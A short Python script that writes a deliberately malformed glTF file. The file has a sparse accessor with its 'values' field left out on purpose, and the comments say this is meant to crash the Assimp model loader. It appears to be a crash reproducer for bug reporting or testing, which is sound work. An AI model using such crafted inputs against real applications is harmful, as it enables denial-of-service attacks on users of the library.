import json

bad_gltf = {
    "asset": {
        "version": "2.0"
    },
    # 1. Direct the loader to a valid starting scene
    "scene": 0,
    "scenes": [
        {
            "nodes": [0]
        }
    ],
    "nodes": [
        {
            "mesh": 0
        }
    ],
    # 2. Attach a primitive mesh that forces Assimp to process the accessor
    "meshes": [
        {
            "primitives": [
                {
                    "attributes": {
                        "POSITION": 0
                    }
                }
            ]
        }
    ],
    "accessors": [
        {
            "componentType": 5126, # FLOAT
            "count": 10,
            "type": "SCALAR",
            "sparse": {
                "count": 1,
                "indices": {
                    "bufferView": 0,
                    "componentType": 5121 # UNSIGNED_BYTE
                }
                # "values" is still intentionally missing here to trigger the crash!
            }
        }
    ],
    "bufferViews": [
        {
            "buffer": 0,
            "byteLength": 4
        }
    ],
    "buffers": [
        {
            "byteLength": 4,
            "uri": "data:application/octet-stream;base64,AAAAAA=="
        }
    ]
}

with open("malformed_sparse.gltf", "w") as f:
    json.dump(bad_gltf, f, indent=2)

print("Updated malformed_sparse.gltf with full scene tree structure!")
